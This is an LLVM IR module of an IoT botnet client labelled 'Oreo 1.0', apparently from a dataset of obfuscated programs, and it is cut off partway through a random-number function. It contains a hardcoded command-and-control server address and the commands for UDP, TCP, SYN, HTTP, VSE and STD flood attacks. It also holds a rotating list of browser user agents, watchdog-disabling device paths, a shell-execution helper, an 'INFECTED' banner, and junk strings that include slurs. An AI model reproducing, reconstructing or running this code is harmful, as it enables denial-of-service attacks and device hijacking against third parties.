; ModuleID = 'host/ir_fla/Oreo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@OreoServer = global [1 x i8*] [i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [18 x i8] c"128.199.197.79:23\00", align 1
@ioctl_pid = global i32 0, align 4
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@rangechoice = global i32 1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@useragents = global [32 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([136 x i8], [136 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([165 x i8], [165 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([164 x i8], [164 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([152 x i8], [152 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.73, i32 0, i32 0)], align 16
@.str.42 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\00", align 1
@.str.43 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.44 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38\00", align 1
@.str.45 = private unnamed_addr constant [136 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53\00", align 1
@.str.46 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\00", align 1
@.str.47 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36\00", align 1
@.str.48 = private unnamed_addr constant [165 x i8] c"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36\00", align 1
@.str.49 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.50 = private unnamed_addr constant [164 x i8] c"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393\00", align 1
@.str.51 = private unnamed_addr constant [152 x i8] c"Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.52 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27\00", align 1
@.str.53 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.54 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\00", align 1
@.str.56 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.58 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.59 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.60 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.61 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.62 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.63 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.64 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.65 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.66 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.67 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.68 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.69 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.70 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.71 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.72 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.73 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.117 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.4 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.5 = private unnamed_addr constant [21 x i8] c"TSource Engine Query\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.41, i32 0, i32 0)], align 16
@.str.6 = private unnamed_addr constant [16 x i8] c"VSzNC0CJti3ouku\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"yhJyMAqx7DZa0kg\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"1Cp9MEDMN6B5L1K\00", align 1
@.str.9 = private unnamed_addr constant [11 x i8] c"miraiMIRAI\00", align 1
@.str.10 = private unnamed_addr constant [10 x i8] c"stdflood4\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"7XLPHoxkvL\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"jmQvYBdRZA\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"eNxERkyrfR\00", align 1
@.str.14 = private unnamed_addr constant [11 x i8] c"qHjTXcMbzH\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"chickennuggets\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"ilovecocaine\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"666666\00", align 1
@.str.18 = private unnamed_addr constant [9 x i8] c"88888888\00", align 1
@.str.19 = private unnamed_addr constant [11 x i8] c"0nnf0l20im\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"uq7ajzgm0a\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"loic\00", align 1
@.str.22 = private unnamed_addr constant [19 x i8] c"ParasJhaIsADumbFag\00", align 1
@.str.23 = private unnamed_addr constant [17 x i8] c"stdudpbasedflood\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"bitcoin1\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"password\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"encrypted\00", align 1
@.str.27 = private unnamed_addr constant [11 x i8] c"suckmydick\00", align 1
@.str.28 = private unnamed_addr constant [13 x i8] c"guardiacivil\00", align 1
@.str.29 = private unnamed_addr constant [13 x i8] c"2xoJTsbXunuj\00", align 1
@.str.30 = private unnamed_addr constant [13 x i8] c"QiMH8CGJyOj9\00", align 1
@.str.31 = private unnamed_addr constant [9 x i8] c"abcd1234\00", align 1
@.str.32 = private unnamed_addr constant [13 x i8] c"GLEQWXHAJPWM\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"ABCDEFGHI\00", align 1
@.str.34 = private unnamed_addr constant [10 x i8] c"abcdefghi\00", align 1
@.str.35 = private unnamed_addr constant [11 x i8] c"qbotbotnet\00", align 1
@.str.36 = private unnamed_addr constant [12 x i8] c"lizardsquad\00", align 1
@.str.37 = private unnamed_addr constant [10 x i8] c"aNrjBnTRi\00", align 1
@.str.38 = private unnamed_addr constant [10 x i8] c"1QD8ypG86\00", align 1
@.str.39 = private unnamed_addr constant [10 x i8] c"IVkLWYjLe\00", align 1
@.str.40 = private unnamed_addr constant [20 x i8] c"nexuszetaisamaddict\00", align 1
@.str.41 = private unnamed_addr constant [15 x i8] c"satoriskidsnet\00", align 1
@sendHTTP.methods = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.76, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0)], align 16
@.str.80 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.81 = private unnamed_addr constant [20 x i8] c" / HTTP/1.1\0D\0AHost: \00", align 1
@.str.82 = private unnamed_addr constant [15 x i8] c"\0D\0AUser-Agent: \00", align 1
@.str.83 = private unnamed_addr constant [15 x i8] c"\0D\0AConnection: \00", align 1
@.str.84 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.74 = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.75 = private unnamed_addr constant [5 x i8] c"HEAD\00", align 1
@.str.76 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.85 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.86 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.88 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.90 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.91 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.92 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.93 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.94 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.95 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.96 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.97 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.98 = private unnamed_addr constant [14 x i8] c"/dev/watchdog\00", align 1
@.str.99 = private unnamed_addr constant [19 x i8] c"/dev/misc/watchdog\00", align 1
@.str.100 = private unnamed_addr constant [23 x i8] c"/dev/FTWDT101_watchdog\00", align 1
@.str.101 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.102 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.103 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.104 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.106 = private unnamed_addr constant [5 x i8] c"FLUX\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"VSE\00", align 1
@.str.108 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.109 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.110 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.111 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.112 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.113 = private unnamed_addr constant [85 x i8] c"\1B[0;31m\1B[43mINFECTED\1B[40m\1B[0m \1B[0;31m----\1B[0;33m>    \1B[0;31m[\1B[0;33m%s\1B[0;31m]  \1B[0m\00", align 1
@.str.114 = private unnamed_addr constant [9 x i8] c"Oreo 1.0\00", align 1
@.str.115 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.116 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -130850956, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -130850956, label %10
    i32 -820739377, label %14
    i32 -1393576771, label %32
    i32 1360987430, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 -820739377, i32 1360987430
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 -1393576771, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 -130850956, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
